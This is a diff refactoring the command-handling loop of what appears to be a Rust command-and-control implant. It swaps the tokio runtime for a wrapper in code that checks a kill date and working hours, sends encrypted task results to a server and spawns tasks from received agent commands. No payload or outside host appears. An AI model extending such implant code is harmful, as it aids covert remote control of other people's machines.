@@ -1,7 +1,13 @@
 use core::ffi::c_void;
 use std::sync::Arc;
+
+#[cfg(feature = "tokio-runtime")]
 use tokio::runtime::Runtime;
+#[cfg(feature = "tokio-runtime")]
 use tokio::sync::mpsc;
+
+#[cfg(feature = "tokio-runtime")]
+use mod_tokio_runtime::TokioRuntimeWrapper;
 
 use rs2_communication_protocol::communication_structs::agent_commands::AgentCommands;
 use rs2_communication_protocol::communication_structs::simple_agent_command::SimpleAgentCommand;
@@ -24,7 +30,7 @@ use crate::command::exit_command;
 use crate::common::generate_path;
 use crate::spawner::TaskSpawner;
 
-pub fn command_handler(rt: Arc<Runtime>) {
+pub fn command_handler(rt: Arc<TokioRuntimeWrapper>) {
     unsafe {
         if !instance().session.connected {
             return;
@@ -32,7 +38,7 @@ pub fn command_handler(rt: Arc<Runtime>) {
 
         //KillDate
         if check_kill_date(instance().config.kill_date) {
-            rt.block_on(async { exit_command(1).await });
+            rt.handle().block_on(async { exit_command(1).await });
         }
 
         // !Working Hours -> continue
@@ -61,7 +67,9 @@ pub fn command_handler(rt: Arc<Runtime>) {
 
             data.with_metadata(metadata);
 
-            let result = rt.block_on(async { protocol.write(data, Some(encryptor.clone())).await });
+            let result = rt
+                .handle()
+                .block_on(async { protocol.write(data, Some(encryptor.clone())).await });
 
             if result.is_ok() {
                 // Aggiungi il parsing di un array di SimpleAgentCommand, con protocol.read, lascia commentate queste righe
@@ -93,10 +101,12 @@ pub fn command_handler(rt: Arc<Runtime>) {
                     };
 
                     let result_tx = result_tx.clone(); // Clone the result transmitter for each task.
-                    let receiver = rt.block_on(async { spawner.spawn_task(command).await }); // Spawn the task and get the result receiver.
+                    let receiver = rt
+                        .handle()
+                        .block_on(async { spawner.spawn_task(command).await }); // Spawn the task and get the result receiver.
 
                     // Spawn a task to send the task's result to the result handler.
-                    rt.spawn(async move {
+                    rt.handle().spawn(async move {
                         if let Ok(result) = receiver.await {
                             let _ = result_tx.send(result).await; // Send the result to the result handler.
                         }
@@ -105,7 +115,7 @@ pub fn command_handler(rt: Arc<Runtime>) {
             }
         }
 
-        rt.block_on(async {
+        rt.handle().block_on(async {
             drop(result_tx); // Close the result channel, indicating no more tasks will send results.
             result_handler_handle.await.unwrap(); // Wait for the result handler to finish processing all results.
         });
@@ -113,13 +123,13 @@ pub fn command_handler(rt: Arc<Runtime>) {
 }
 
 pub fn result_handler(
-    rt: Arc<Runtime>,
+    rt: Arc<TokioRuntimeWrapper>,
     mut result_rx: mpsc::Receiver<TaskOutput>,
 ) -> tokio::task::JoinHandle<()> {
     let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };
     let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
 
-    rt.spawn(async move {
+    rt.handle().spawn(async move {
         while let Some(result) = result_rx.recv().await {
             // Send the result to the server using the protocol
             protocol
